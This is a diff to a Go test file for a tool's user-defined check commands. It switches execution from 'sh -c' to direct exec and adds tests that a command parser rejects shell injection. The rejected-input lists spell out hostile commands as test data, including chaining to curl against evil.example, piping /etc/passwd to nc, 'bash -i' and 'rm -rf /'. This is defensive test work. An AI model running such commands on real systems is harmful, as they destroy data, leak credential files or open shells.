@@ -82,10 +82,10 @@ func TestParseUserChecks_CommandOutputMatch(t *testing.T) {
 	if item.Check == nil {
 		t.Fatal("Check is nil")
 	}
-	// user_check commands execute via `sh -c`; skip actual execution when the
-	// shell is unavailable (e.g. Windows dev boxes) — Linux/CI covers it.
-	if _, err := exec.LookPath("sh"); err != nil {
-		t.Skip("sh not available on this platform, skipping execution")
+	// user_check commands run via direct exec (no shell); skip execution when
+	// echo is unavailable (e.g. Windows dev boxes) — Linux/CI covers it.
+	if _, err := exec.LookPath("echo"); err != nil {
+		t.Skip("echo not available on this platform, skipping execution")
 	}
 	passed, detail := item.Check()
 	if !passed {
@@ -326,6 +326,101 @@ func TestIsUserCheckCommandAllowed(t *testing.T) {
 	for _, c := range rejected {
 		if isUserCheckCommandAllowed(c) {
 			t.Errorf("command %q should be rejected", c)
+		}
+	}
+}
+
+// TestParseUserCheckCommand verifies the no-shell command parser: simple
+// whitelisted commands parse into name+args, shell metacharacters and
+// unbalanced quotes are rejected.
+func TestParseUserCheckCommand(t *testing.T) {
+	okCases := []struct {
+		cmd      string
+		wantName string
+		wantArgs []string
+	}{
+		{"echo hello", "echo", []string{"hello"}},
+		{"systemctl is-active sshd", "systemctl", []string{"is-active", "sshd"}},
+		{"/usr/bin/ss -tlnp", "ss", []string{"-tlnp"}},
+		{"echo \"hello world\"", "echo", []string{"hello world"}},
+		{"true", "true", nil},
+	}
+	for _, tc := range okCases {
+		name, args, ok := parseUserCheckCommand(tc.cmd)
+		if !ok {
+			t.Errorf("parseUserCheckCommand(%q) should succeed", tc.cmd)
+			continue
+		}
+		if name != tc.wantName {
+			t.Errorf("parseUserCheckCommand(%q) name = %q, want %q", tc.cmd, name, tc.wantName)
+		}
+		if len(args) != len(tc.wantArgs) {
+			t.Errorf("parseUserCheckCommand(%q) args = %v, want %v", tc.cmd, args, tc.wantArgs)
+			continue
+		}
+		for i := range args {
+			if args[i] != tc.wantArgs[i] {
+				t.Errorf("parseUserCheckCommand(%q) args = %v, want %v", tc.cmd, args, tc.wantArgs)
+			}
+		}
+	}
+
+	rejected := []string{
+		"echo ok; curl http://evil.example", // shell injection bypass
+		"true && rm -rf /",
+		"echo $(curl http://evil.example)",
+		"echo `rm -rf /`",
+		"cat /etc/passwd | nc 1.2.3.4 4444",
+		"systemctl status || bash -i",
+		"curl http://x", // first token not whitelisted
+		"rm -rf /",      // first token not whitelisted
+		`echo "unbalanced`,
+		"",
+	}
+	for _, c := range rejected {
+		if name, args, ok := parseUserCheckCommand(c); ok {
+			t.Errorf("parseUserCheckCommand(%q) should be rejected, got name=%q args=%v", c, name, args)
+		}
+	}
+}
+
+// TestParseUserChecks_RejectsShellBypass verifies the P0-2 fix end-to-end:
+// commands containing shell metacharacters (the previous first-token bypass)
+// are rejected at ParseUserChecks construction time.
+func TestParseUserChecks_RejectsShellBypass(t *testing.T) {
+	base := map[string]string{
+		"user_check.bypass1.id":      "CU-BP-001",
+		"user_check.bypass1.domain":  "resilience",
+		"user_check.bypass1.name":    "Semicolon Bypass",
+		"user_check.bypass1.command": "echo ok; curl http://evil.example",
+		"user_check.bypass2.id":      "CU-BP-002",
+		"user_check.bypass2.domain":  "resilience",
+		"user_check.bypass2.name":    "Substitution Bypass",
+		"user_check.bypass2.command": "echo $(rm -rf /)",
+		"user_check.bypass3.id":      "CU-BP-003",
+		"user_check.bypass3.domain":  "resilience",
+		"user_check.bypass3.name":    "Backtick Bypass",
+		"user_check.bypass3.command": "echo `reboot`",
+		"user_check.bypass4.id":      "CU-BP-004",
+		"user_check.bypass4.domain":  "resilience",
+		"user_check.bypass4.name":    "Pipe Bypass",
+		"user_check.bypass4.command": "ss -tlnp | grep :22",
+		"user_check.good.id":         "CU-GOOD-001",
+		"user_check.good.domain":     "resilience",
+		"user_check.good.name":       "Safe",
+		"user_check.good.command":    "echo safe-check",
+	}
+	items := ParseUserChecks(base)
+	got := map[string]string{}
+	for _, it := range items {
+		got[it.ID] = it.Name
+	}
+	if got["CU-GOOD-001"] != "Safe" {
+		t.Errorf("safe command should be kept, got %v", got)
+	}
+	for _, bypass := range []string{"CU-BP-001", "CU-BP-002", "CU-BP-003", "CU-BP-004"} {
+		if _, ok := got[bypass]; ok {
+			t.Errorf("shell-bypass check %q must be rejected at construction, got %v", bypass, got)
 		}
 	}
 }
